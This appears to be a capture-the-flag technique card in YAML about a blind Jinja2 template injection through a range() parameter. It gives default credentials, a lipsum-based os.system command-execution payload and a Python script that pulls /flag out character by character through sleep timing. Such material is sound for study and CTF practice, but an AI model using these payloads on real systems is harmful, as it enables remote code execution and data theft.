name: blind_ssti_jinja2_range_injection
category: web
tags: [ssti, jinja2, blind, time_based, command_injection, default_credentials, f-string]
indicators:
  - "Python f-string concatenates Jinja2 template"
  - "User input concatenated into template function parameter (e.g., range())"
  - "Filters { } % but filtering happens after f-string interpolation"
  - "Default credentials exist"

tricks:
  - name: "Step 1: Identify default credentials"
    when: "Analyze source code"
    how: "Default account test:test exists"
    payload: |
      username='test', password='test'

  - name: "Step 2: Understand vulnerability"
    when: "Analyze routes.py"
    how: "term parameter injected into range() in f-string template"
    payload: |
      # Vulnerable code flow:
      term = request.args.get('term')
      if "{" in term: return error  # Filter { } %
      table_template = f"{% for row in range({term}) %}"  # Injection point
      render_template_string(table_template)

  - name: "Step 3: Understand blind nature"
    when: "Understand attack limitations"
    how: "Injection in range() expects integer, output not visible"
    payload: |
      # Must use time-based blind extraction
      range(lipsum.__globals__['os'].system('cmd') or 1)

  - name: "Step 4: Construct base payload"
    when: "Need command execution"
    how: "Use Jinja2 lipsum global to access os module"
    payload: |
      lipsum.__globals__['os'].system('command') or 1

  - name: "Step 5: Time-based blind extraction"
    when: "Cannot exfiltrate data directly"
    how: "Use sleep command with binary search for each character"
    payload: |
      cmd = f"test $(head -c{pos} /flag | tail -c1 | od -An -td1) -gt {mid} && sleep 1"
      payload = f"lipsum.__globals__['os'].system('{cmd}') or 1"

  - name: "Step 6: Extract the flag"
    when: "Execute attack"
    how: "Login, binary search each character via response time"
    payload: |
      s = requests.Session()
      s.post(f"{TARGET}/login", data={"username": "test", "password": "test"})

      for pos in range(1, 80):
          # Binary search for ASCII value at position
          cmd = f"test $(head -c{pos} /flag | tail -c1 | od -An -td1) -gt {mid} && sleep 1"
          payload = f"lipsum.__globals__['os'].system('{cmd}') or 1"
          s.get(f"{TARGET}/amortization", params={"term": payload})
